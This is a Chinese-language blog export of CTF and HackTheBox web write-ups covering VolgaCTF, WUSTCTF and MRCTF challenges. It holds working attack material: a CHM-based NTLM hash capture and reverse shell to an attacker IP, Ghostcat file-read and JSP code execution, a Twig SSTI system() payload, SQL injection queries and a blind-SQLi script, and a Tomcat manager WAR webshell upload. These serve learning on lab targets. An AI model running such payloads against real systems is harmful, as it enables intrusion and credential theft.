有意思。似乎在提示我们,传到这个文件夹下的东西可能会被CEO检测。这也就类似xss中我们的payload被检查时可以打到admin的cookie.这里我们是否也能通过可执行文件让administrator检查,拿到administrator的权限呢？同样在Chris的Downloads目录下我们发现一个instructions.chm文件。拿到windows本机打开,将发现那么我们应该就是要使用chm文件进行操作了。同时利用的思路也大致清楚了： 1231.windows本机下操作生成chm文件2.上传chm文件,其中payload将打到本机 #类似xss的道理3.监听本机，得到administrator信息。 简单提下chm文件。其实就是html文件的帮助文件系统。而且想要操作起来很简单,只要在win10电脑的C:\\Program Files (x86)\\HTML Help Workshop中即可找到。当然我们还要从微软官网下载最新的https://www.microsoft.com/en-us/download/details.aspx?id=21138先创建一个html文件 1234567&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hacked by byc_404&lt;/h1&gt;&lt;img src=\\\\10.10.15.189\\htb\\23333.jpg/&gt;&lt;/body&gt;&lt;/html&gt; 里面的src资源指向我们本机任意资源，说白了就是让admin触发且我们能收到请求而已。在windows本机以管理员权限打开hhw.exe，创建test.hpp项目添加我们刚刚的index.html并编译，即可生成一个chm文件。然后回到本机,先起一个监听responder -I tun0 wget上传文件到docs文件夹下 1wget http://10.10.15.189/test.chm -O exp.chm 很快就能收到请求这是一串管理员密码的hash.到网站上解码可得管理员密码butterfly!#1. 然后登尝试登陆。由于开放了445端口，我们直接用smb服务可以直接登录。当然我没有起smb服务，使用下面github上的python脚本即可替代。 123git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket pip install .python psexec.py Administrator@10.10.10.151 成功拿到rootshell. 当然还有类似前面的直接反弹rootshell的方法。因为chm文件甚至可以插入powershell命令，所以我们可以直接生成反弹shell的html.这里直接借用看到的dalao的chm。或者使用powershell命令生成payloadhttps://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1 1Out-CHM –Payload \"C:windows\\temp\\exp.exe 10.10.15.189 6666 -e powershell.exe\" –HHCPath “C:\\Program Files (x86)\\HTML Help Workshop” 这样就能直接在administrator检查时反弹到shell. 小结这次windows靶机的体验还算不错。因为不熟悉的原因接触了不少新知识。有很多细节还没弄明白，但是也学到了不少windows靶机新知识。的确，CTFer 不能总是待在舒适区。国际赛也好，htb靶机渗透也好，都是接触非国内渗透知识的大好途径。毕竟也打了一段时间比赛了，国内的比赛除了大型比赛能有很多新姿势以及新想法学以外，其他的出题思路或者赛事操作都是老生常谈，拘泥于php或者个别trick的泥潭中。这几天尝试了java题，windows题，都算是一种突破常规的尝试吧。希望自己也能成为有想法的CTFer。而不是一个单纯的CTF赛棍.","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"},{"name":"windows","slug":"windows","permalink":"https://www.bycsec.top/tags/windows/"}]},{"title":"VolgaCTF2020Qualifier复现","slug":"VolgaCTF2020Qualifier复现","date":"2020-03-30T13:47:25.000Z","updated":"2021-02-18T05:09:52.269Z","comments":true,"path":"2020/03/30/VolgaCTF2020Qualifier复现/","link":"","permalink":"https://www.bycsec.top/2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/","excerpt":"比赛没有怎么认真打，但是毕竟题还是看了的。除了幽灵猫以外的题也是很有价值的，好好学习一波。 NetCorp这个周末最大的收获就是做了几道java题，对java题的相关套路有了一定了解。比如此题，开始上来页面并无任何有用信息。唯一能做的从路由下手，这里不使用路径爆破工具的话，可以通过构造一些错误路径来尝试爆版本以及爆服务。这里在bp通过构造爆出了tomcat服务的相关信息。","text":"比赛没有怎么认真打，但是毕竟题还是看了的。除了幽灵猫以外的题也是很有价值的，好好学习一波。 NetCorp这个周末最大的收获就是做了几道java题，对java题的相关套路有了一定了解。比如此题，开始上来页面并无任何有用信息。唯一能做的从路由下手，这里不使用路径爆破工具的话，可以通过构造一些错误路径来尝试爆版本以及爆服务。这里在bp通过构造爆出了tomcat服务的相关信息。 而且访问/docs，得到apachetomcat信息,是9.0.24版本。基本确定是道java题， 接下来去搜索相关信息，发现了这样一个漏洞：CVE-2020-1938 即tomcat的ghostcat漏洞值得一提的是,ghostcat漏洞是由长亭爆出来的洞，GhostCat 主要是存在文件读取和包含漏洞影响范围很广，几乎囊括了6-9版本。我们又知道，文件上传+文件包含=RCE.因此尝试利用相关工具先进行文件读取，看看有无收获。开始用的exp是这个https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi,但是只能读文件不可执行命令。因此作罢。我后来使用的exp来自https://github.com/00theway/Ghostcat-CNVD-2020-10487这个exp不仅可以文件读取还可以包含，因此更适合 首先,对tomcat服务必读的文件就是WEB-INF/web.xml尝试读取python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru 8009 /WEB-INF/web.xml read 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"http://java.sun.com/dtd/web-app_2_3.dtd\" &gt;&lt;web-app&gt; &lt;display-name&gt;NetCorp&lt;/display-name&gt; &lt;servlet&gt; &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt; &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt; &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt; &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt; &lt;display-name&gt;ServeComplaint&lt;/display-name&gt; &lt;description&gt;Complaint info&lt;/description&gt; &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt; &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;error-page&gt; &lt;error-code&gt;404&lt;/error-code&gt; &lt;location&gt;/404.html&lt;/location&gt; &lt;/error-page&gt; &lt;/web-app&gt; 可以看到除了404.html这样的页面还有两个类的信息。这里可以推断class文件的路径,通过反编译class文件，得到网站源码我按照roarctf easyjava的经验构造路径,路径勉强算理解，好歹我也是java入门编程的…WEB-INF/classes/ru/volgactf/netcorp/ServeComplaintServlet.class，另一个同理。 12python3 ajpShooter.py http:&#x2F;&#x2F;netcorp.q.2020.volgactf.ru:7782 8009 &#x2F;WEB-INF&#x2F;classes&#x2F;ru&#x2F;volgactf&#x2F;netcorp&#x2F;ServeComplaintServlet.class read -o complaint.classpython3 ajpShooter.py http:&#x2F;&#x2F;netcorp.q.2020.volgactf.ru:7782 8009 &#x2F;WEB-INF&#x2F;classes&#x2F;ru&#x2F;volgactf&#x2F;netcorp&#x2F;ServeScreenshotServlet.class read -o screenshoot.class 反编译后得到以下源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.geocities.com/kpdus/jad.html// Decompiler options: packimports(3) // Source File Name: ServeComplaintServlet.javapackage ru.volgactf.netcorp;import java.io.IOException;import java.io.PrintStream;import javax.servlet.ServletConfig;import javax.servlet.ServletException;import javax.servlet.http.*;public class ServeComplaintServlet extends HttpServlet&#123; public ServeComplaintServlet() &#123; System.out.println(\"ServeScreenshotServlet Constructor called!\"); &#125; public void init(ServletConfig config) throws ServletException &#123; System.out.println(\"ServeScreenshotServlet \\\"Init\\\" method called\"); &#125; public void destroy() &#123; System.out.println(\"ServeScreenshotServlet \\\"Destroy\\\" method called\"); &#125; protected void doGet(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse) throws ServletException, IOException &#123; &#125; protected void doPost(HttpServletRequest httpservletrequest, HttpServletResponse httpservletresponse) throws ServletException, IOException &#123; &#125; private static final long serialVersionUID = 1L; private static final String SAVE_DIR = \"uploads\";&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.geocities.com/kpdus/jad.html// Decompiler options: packimports(3) // Source File Name: ServeScreenshotServlet.javapackage ru.volgactf.netcorp;import java.io.*;import java.math.BigInteger;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Collection;import java.util.Iterator;import javax.servlet.*;import javax.servlet.http.*;public class ServeScreenshotServlet extends HttpServlet&#123; public ServeScreenshotServlet() &#123; System.out.println(\"ServeScreenshotServlet Constructor called!\"); &#125; public void init(ServletConfig config) throws ServletException &#123; System.out.println(\"ServeScreenshotServlet \\\"Init\\\" method called\"); &#125; public void destroy() &#123; System.out.println(\"ServeScreenshotServlet \\\"Destroy\\\" method called\"); &#125; protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; String appPath = request.getServletContext().getRealPath(\"\"); String savePath = (new StringBuilder()).append(appPath).append(\"uploads\").toString(); File fileSaveDir = new File(savePath); if(!fileSaveDir.exists()) fileSaveDir.mkdir(); String submut = request.getParameter(\"submit\"); if(submut != null) if(submut.equals(\"true\")); PrintWriter out = request.getParts().iterator(); do &#123; if(!out.hasNext()) break; Part part = (Part)out.next(); String fileName = extractFileName(part); fileName = (new File(fileName)).getName(); String hashedFileName = generateFileName(fileName); String path = (new StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString(); if(!path.equals(\"Error\")) part.write(path); &#125; while(true); out = response.getWriter(); response.setContentType(\"application/json\"); response.setCharacterEncoding(\"UTF-8\"); out.print(String.format(\"&#123;'success':'%s'&#125;\", new Object[] &#123; \"true\" &#125;)); out.flush(); &#125; private String generateFileName(String fileName) &#123; String s2; StringBuilder sb; MessageDigest md = MessageDigest.getInstance(\"MD5\"); md.update(fileName.getBytes()); byte digest[] = md.digest(); s2 = (new BigInteger(1, digest)).toString(16); sb = new StringBuilder(32); int i = 0; for(int count = 32 - s2.length(); i &lt; count; i++) sb.append(\"0\"); return sb.append(s2).toString(); NoSuchAlgorithmException e; e; e.printStackTrace(); return \"Error\"; &#125; private String extractFileName(Part part) &#123; String contentDisp = part.getHeader(\"content-disposition\"); String items[] = contentDisp.split(\";\"); String as[] = items; int i = as.length; for(int j = 0; j &lt; i; j++) &#123; String s = as[j]; if(s.trim().startsWith(\"filename\")) return s.substring(s.indexOf(\"=\") + 2, s.length() - 1); &#125; return \"\"; &#125; private static final String SAVE_DIR = \"uploads\";&#125; 主要内容在于ServeScreenshotServlet这个类。我们得到了上传文件的存在，也就是说可以通过上传+包含构造RCE了。简单读下源码，其实就是指上传文件会传到/upload下，同时文件名变为上传文件名的md5值直接使用curl传文件curl -vv -F &quot;data=@myexp.jsp&quot; http://netcorp.q.2020.volgactf.ru:7782/ServeScreenshotmyexp.jsp 12345678910111213&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;&lt;% out.println(\"Executing command\");Process p = Runtime.getRuntime().exec(\"ls\");OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125;%&gt; 执行python3 ajpShooter.py http://netcorp.q.2020.volgactf.ru 8009 /uploads/78e1e40f057500a0dd0209effb7514d3 eval 注意到flag.txt的存在,那么直解更改命令上传后再次执行即可 Newsletter这题网上找不到免费的能收邮件的服务器，应该是要个SMTP的。没办法只能学学Twig打ssti的用法了。题目首先给出看源码 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace App\\Controller;use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;use Symfony\\Component\\HttpFoundation\\Response;use Symfony\\Component\\HttpFoundation\\Request;use Symfony\\Component\\Mailer\\MailerInterface;use Symfony\\Component\\Mime\\Email;class MainController extends AbstractController&#123; public function index(Request $request) &#123; return $this-&gt;render('main.twig'); &#125; public function subscribe(Request $request, MailerInterface $mailer) &#123; $msg = ''; $email = filter_var($request-&gt;request-&gt;get('email', ''), FILTER_VALIDATE_EMAIL); if($email !== FALSE) &#123; $name = substr($email, 0, strpos($email, '@')); $content = $this-&gt;get('twig')-&gt;createTemplate( \"&lt;p&gt;Hello $&#123;name&#125;.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;\" )-&gt;render(); $mail = (new Email())-&gt;from('newsletter@newsletter.q.2020.volgactf.ru')-&gt;to($email)-&gt;subject('VolgaCTF Newsletter')-&gt;html($content); $mailer-&gt;send($mail); $msg = 'Success'; &#125; else &#123; $msg = 'Invalid email'; &#125; return $this-&gt;render('main.twig', ['msg' =&gt; $msg]); &#125; public function source() &#123; return new Response('&lt;pre&gt;'.htmlspecialchars(file_get_contents(__FILE__)).'&lt;/pre&gt;'); &#125;&#125; 首先不用说，${name}这里存在ssti的。同时确认是twig模板的。$email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);这句过滤很好绕，只需要6@domain.tld就可以在收清求的地方看到ssti的效果了。flag在etc/passwd中payload: 1&quot;&#123;&#123;[&#39;cat$&#123;IFS&#125;&#x2F;etc&#x2F;passwd&#39;]|filter(&#39;system&#39;)&#125;&#125;&quot;@y 因为没法亲自动手所以只好搬运payload了，惭愧… Library在注册时可以抓包发现/api的路由 根据传输及返回形式，可以判断出是GrpahQL的api接口,同时也有个经典的利用，就是传{__schema{types{name}}},可以通过__schema查询所有可用对象：尝试直接访问无果，post传值{&quot;query&quot;:&quot;{ __schema { types { name } } }&quot;}(这里要稍微根据之前传值的方式构造一下) 1&#123;\"data\":&#123;\"__schema\":&#123;\"types\":[&#123;\"name\":\"Query\"&#125;,&#123;\"name\":\"String\"&#125;,&#123;\"name\":\"LoginUser\"&#125;,&#123;\"name\":\"LoginResponse\"&#125;,&#123;\"name\":\"UserFilter\"&#125;,&#123;\"name\":\"User\"&#125;,&#123;\"name\":\"Book\"&#125;,&#123;\"name\":\"Mutation\"&#125;,&#123;\"name\":\"RegisterUser\"&#125;,&#123;\"name\":\"__Schema\"&#125;,&#123;\"name\":\"__Type\"&#125;,&#123;\"name\":\"__TypeKind\"&#125;,&#123;\"name\":\"Boolean\"&#125;,&#123;\"name\":\"__Field\"&#125;,&#123;\"name\":\"__InputValue\"&#125;,&#123;\"name\":\"__EnumValue\"&#125;,&#123;\"name\":\"__Directive\"&#125;,&#123;\"name\":\"__DirectiveLocation\"&#125;]&#125;&#125;&#125; 使用如下payload可以一个个的爆出我们可能可以利用的schema的信息{&quot;query&quot;:&quot;{ __type(name: \\&quot;User\\&quot;) { name fields { name type { name kind }}}}&quot;} 1&#123;\"data\":&#123;\"__type\":&#123;\"name\":\"User\",\"fields\":[&#123;\"name\":\"login\",\"type\":&#123;\"name\":\"String\",\"kind\":\"SCALAR\"&#125;&#125;,&#123;\"name\":\"name\",\"type\":&#123;\"name\":\"String\",\"kind\":\"SCALAR\"&#125;&#125;,&#123;\"name\":\"email\",\"type\":&#123;\"name\":\"String\",\"kind\":\"SCALAR\"&#125;&#125;]&#125;&#125;&#125; 这就告诉我们，User object有三个Field.login, name ,email.同理我们爆下其他的,比如重点关注的Query回显： 1&#123;&quot;data&quot;:&#123;&quot;__type&quot;:&#123;&quot;name&quot;:&quot;Query&quot;,&quot;fields&quot;:[&#123;&quot;name&quot;:&quot;_empty&quot;,&quot;type&quot;:&#123;&quot;name&quot;:&quot;String&quot;,&quot;kind&quot;:&quot;SCALAR&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;login&quot;,&quot;type&quot;:&#123;&quot;name&quot;:&quot;LoginResponse&quot;,&quot;kind&quot;:&quot;OBJECT&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;testGetUsersByFilter&quot;,&quot;type&quot;:&#123;&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;&#125;&#125;,&#123;&quot;name&quot;:&quot;books&quot;,&quot;type&quot;:&#123;&quot;name&quot;:null,&quot;kind&quot;:&quot;LIST&quot;&#125;&#125;]&#125;&#125;&#125; 发现一个testGetUsersByFilter,似乎很有意思。也许它对可注的点进行了过滤,但这就意味着我们可以进行注入。于是我们进行基本的查询。此时目标应该是sql注入，寻找可注点。 1&#123;\"query\":\"query testGetUsersByFilter($input: UserFilter) &#123;\\n testGetUsersByFilter(filter: $input) &#123;\\n login email name \\n &#125;\\n&#125;\\n\",\"variables\":&#123;\"input\":&#123;\"login\":\"test\",\"email\":\"test\",\"name\":\"test\"&#125;&#125;&#125; 构造这样一个查询语句。此时我们需要通过控制login email,name的值来测试是否存在注入 1&#123;\"query\":\"query testGetUsersByFilter($input: UserFilter) &#123;\\n testGetUsersByFilter(filter: $input) &#123;\\n login email name \\n &#125;\\n&#125;\\n\",\"variables\":&#123;\"input\":&#123;\"login\":\"'\",\"email\":\"1231321\",\"name\":\"3213\"&#125;&#125;&#125; 当尝试sql注入常见的单引号时，发现返回的结果对应的login居然是空的。所以看来单引号被过滤了。但这并不是什么问题。因为逃逸单引号也是个考烂的trick了。 将我们传参部分input的值改为：{&quot;login&quot;:&quot;test\\\\&quot;,&quot;name&quot;:&quot; union select * from users -- &quot;}发现将返回所有用户名。至此sql注入已经确认可注，接下来就是挖掘信息了。先order by 测字段数，发现是6个 然后执行查询，发现回显字段是2,6,5union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()#发现flag表,flag列，查询即可","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"WUSTCTF&MRCTF部分web题解","slug":"WUSTCTF&MRCTF部分web题解","date":"2020-03-29T01:42:17.000Z","updated":"2021-02-18T05:09:55.641Z","comments":true,"path":"2020/03/29/WUSTCTF&MRCTF部分web题解/","link":"","permalink":"https://www.bycsec.top/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/","excerpt":"这周末顺手打了下两个新生赛。本来不想写wp的,但是想到上周BJD比赛的wp也没写就想着还是补着吧。（上周BJD不写是因为对比赛题目心里有意见，说是新生赛，脑洞跟套娃题把一堆老手都整得不舒服。当时差一道ASP.NET,因为ysoserial的gadget用的不对就一直出不了结果，直接心态搞崩）所以这次把这两个新生赛题目写写。具体只大致讲下思路吧","text":"这周末顺手打了下两个新生赛。本来不想写wp的,但是想到上周BJD比赛的wp也没写就想着还是补着吧。（上周BJD不写是因为对比赛题目心里有意见，说是新生赛，脑洞跟套娃题把一堆老手都整得不舒服。当时差一道ASP.NET,因为ysoserial的gadget用的不对就一直出不了结果，直接心态搞崩）所以这次把这两个新生赛题目写写。具体只大致讲下思路吧 WUSTCTF很有意思，题目里php难度都比较基础。java难度就不一样了，估计是java接触的少的原因吧。 checkin进去一个前端验证。限制按钮跟长度。前端把按钮解决后抓个包传出题人名字就好，得到出题人blog(老实说恶意引流不好吧……)可以在博客前端看到部分flag，但是只有一半，后一半通过博客链接到github去,可以找到后半部分 admin开始随手一个万能密码admin&#39; or 1=1#就进去了。/adddddddddddddddddddddddminnnnnnnnnnnnnnnnnnnnnn.php然后就是改header以及get，post值即可得到paste.ubuntu分段给出的网页链接，找到正确的即可得到编码后的flag。解码即可 CV Maker基础上传,登录注册后先上传一个php,报的是exif_imagetype()检查。那就只要文件头解决就好了，传一个马,前面加上GIF89A即可。(这里还有uploads的目录遍历,随便一个都是现成的参考案例)蚁剑连接后根目录/readflag即可。 easyweb这题是道java题。我用非预期做出来的。毕竟自己java知识有限…… 首先进去又是个上传，传一个文件上去看到爆出一个download路由与file参数那就有任意文件下载java题必读的几个配置文件,首先就是WEB-INF下的web.xml 123456789101112131415161718192021 &lt;context-param&gt; &lt;param-name&gt;webAppRootKey&lt;/param-name&gt; &lt;param-value&gt;tomcat.ajp&lt;/param-value&gt; &lt;/context-param&gt; &lt;listener&gt; &lt;listener-class&gt; org.springframework.web.util.WebAppRootListener &lt;/listener-class&gt; &lt;/listener&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;/WEB-INF/views/index.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt; &lt;error-page&gt; &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt; &lt;location&gt;/error&lt;/location&gt; &lt;/error-page&gt;&lt;/web-app&gt; 只有一个index.jsp,同样下载后发现没什么内容。这时开始尝试读取其他文件，构造后发现可以读取到/etc/passwd 1234567891011121314151617181920212223242526root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/falsemessagebus:x:101:102::/var/run/dbus:/bin/falsesshd:x:102:65534::/run/sshd:/usr/sbin/nologinsystemd-timesync:x:103:104:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:104:105:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:/run/systemd:/bin/falsetomajp:x:1000:1000::/home/tomajp:/bin/bash 有意思的是,我们题目起的tomajp用户的家目录是 bin/bash.这点让我想起了之前做网鼎杯Comment这道题的一个收获：二次注入,数据库却没有flag,通过读取.bash_history发现了其他文件夹中未删除的flag从而读取。那么本题尝试读取/home/tomajp/.bash_history发现有蹊跷，拖到下面有发现根据这里记录的操作可以看到，flag应该是在根目录的flaaaag文件夹下的what_you_want直接读取即可/download?file=../../../../../../../../../flaaaag/what_you_want 问了下官方,的确是个比较简单的非预期,预期解是上传jsp进行RCE.但是我一直没弄明白tomcat里上传目录要怎么访问，这个可能是吃了不熟悉javaweb的锅。不说了，之前说好要学javaweb也得提上日程了。ps:赛后了解到是ghostcat打。这个就很有趣了，因为同期的另一个国际赛有题也是这个幽灵猫。找时间等buu上靶机了复现下这个洞。不用等了，直接看我下一篇文章即可。做一个脚本小子，ghostcat利用还是不难的。 朴实无华先放一个没拿到一血的原因手慢一步加上出题人权限没控好,直接flag被删了。导致我多花了半个小时,找出题人沟通后好了。不过说到底慢一步flag被删还是因为只有二血的手速…… 首先是信息收集，这里奇怪的一点是/.git/目录直接暴露在外了,但是仔细观察下发现只是个lamp的git.不知道是不是为了混淆视听故意放的。反正我是githack用了几次才察觉不对劲的。 个人信息收集一直是手测,测了好多源码泄露没反应后注意到index.php网页的标题为bot。于是考虑robots.txt，发现了fAke_f1agggg.php访问后当然没有真flag，但是header里有fl4g.php，得到题目源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader('Content-type:text/html;charset=utf-8');error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET['num']))&#123; $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;\"; &#125;else&#123; die(\"金钱解决不了穷人的本质问题\"); &#125;&#125;else&#123; die(\"去非洲吧\");&#125;//level 2if (isset($_GET['md5']))&#123; $md5=$_GET['md5']; if ($md5==md5($md5)) echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;\"; else die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\");&#125;else&#123; die(\"去非洲吧\");&#125;//get flagif (isset($_GET['get_flag']))&#123; $get_flag = $_GET['get_flag']; if(!strstr($get_flag,\" \"))&#123; $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;\"; system($get_flag); &#125;else&#123; die(\"快到非洲了\"); &#125;&#125;else&#123; die(\"去非洲吧\");&#125;?&gt; 老套娃了。第一层一个intval的问题。这里使用的是一个进制的技巧，比如2020的16进制7e4intval会将字符串7e4认作7,而intval(“7e4”+1)则被类型转换，变为70001 第二层弱类型比较的问题$md5==md5($md5)但是原来校赛总结时就强调过，网上一直以来的说法很不准确。并非是0e开头才会被判作0.而是因为0e开头且纯数字然后才能被转为0https://www.jianshu.com/p/52f04f85824e故我们需要0e开头纯数字的数，使得其MD5值0e开头且纯数字。因此这个一定是要脚本跑的，所以我选择放弃hhh。找队友要了以前讲过这个trick的文章，得到了这个神奇数字0e215962017 第三层基础至极。ca\\t可以绕过关键字，${IFS}替代空格，读flag可以直接用fll*，或者直接cat cat `ls` 即可。主要还是被人搅屎导致多试了好久,还顺便打算弹shell。结果试了5种方法都没成,真的气人payload 1?num&#x3D;7e4&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;ca\\t$&#123;IFS&#125;&#96;ls&#96; 颜值成绩查询裸的数值布尔盲注，直接上if分流就完事。好像过滤了空格，那就括号多套一下。因为打错了参数stunum，导致只拿到三血。气死了…以后一定直接复制粘贴url。吃大亏。 123456789101112131415import requestsimport urllib.parseurl='http://101.200.53.102:10114/index.php?stunum='flag=''for i in range(1,50): print(i) for str1 in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&#123;&#125;-\": payload = \"if(ascii(substr((select(group_concat(value))from(flag)),\"+str(i)+\",1))=\" + str(ord(str1)) + \",1,2)\" payload = urllib.parse.quote(payload) r = requests.get(url + payload) if 'admin' in r.text: flag+=str1 print(flag) break 有道1解题貌似很顶就没有看。 Train Yourself To Be Godly到buu上复现了。仔细做会发现还是细节上问题比较多。首先是分析。因为题目显示的页面是tomcat默认的/examples路由。那么说明是用examples做的根目录https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf然后是这个文档。可以构造路径穿越，来到其他路径下。比如此处为了getshell,进入/manager构造/..;/manager之后一个tomcat:tomcat的弱口令。具体getshell流程可以参考vulhub上tomcat/tomcat8的漏洞Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞。[https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8](https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8)我也简单复现了下，可以去我的vulhub复现文章那看。先给出webshell.jsp与webshell.war的生成方法 123&lt;% %&gt; 带回显与密码的jsp，比较好用。然后命令行可以生成warjar cvf webshell.war webshell.jsp貌似直接压缩jsp成zip然后改后缀为war也可以。进入后自然是上传war包了。但是很快发现点击上传后返回404。而它的路径给的是 1&#x2F;examples&#x2F;..;&#x2F;manager&#x2F;html&#x2F;upload?org.apache.catalina.filters.CSRF_NONCE&#x3D;A226F07F06C2C983EE2911A5963BFA84 看来是又从根目录开始加载路径了，这个用同样的方法，将路径改成/..;/manager/html/upload......即可不过很快会发现401。未授权访问。如果熟悉tomcat的很快能反应过来是少了header里的认证，当然在成功访问后台时抓包也能看到自己的header中有认证头。Authorization: Basic dG9tY2F0OnRvbWNhdA==后面就是tomcat:tomcat的base64编码。这里显然因为我们是通过构造路径穿越的问题，没有在upload时自动带上。那么继续上传，发现403.只能是cookie的问题了。回头去看访问/..;/manager/html时就存在set-cookie的返回。那么只能是缺cookie了。具体做法：重新访问一遍/..;/manager/html从返回头取一个cookie.然后上传时抓包拦截，把认证跟cookie以及访问地址全部改好，直到200为止。然后就可以访问webshell进行命令执行了。这里flag比赛是在根目录的文章中，buu是在根目录./..;/webshell/exp.jsp?pwd=023&amp;i=cat%20/flagggg MRCTF天璇的比赛相对WUST就难一点，然而还是一堆套娃。心里苦。套娃题多真的是CTF比赛怪现状了,脱离了CTF的本质… ezbypass老套娃了。方法都老套了。第一步一个MD5碰撞，网上一堆现成的。第二步一个isnumeric()，只需要在数字后随便加个符号就可以绕过 你传你🐎呢文件上传基本套路，试了下发现php可解析的几个后缀都没了。那试试.htaccess发现可以。那就没事了，绕文件检查上传jpg图片马 1addtype application&#x2F;x-httpd-php .jpg PYwebsite我承认这题是我自己菜了。开始前端一个验证MD5，但是是个js。我还跑去搜js的MD5弱类型，发现好像就没有这个trick啊… 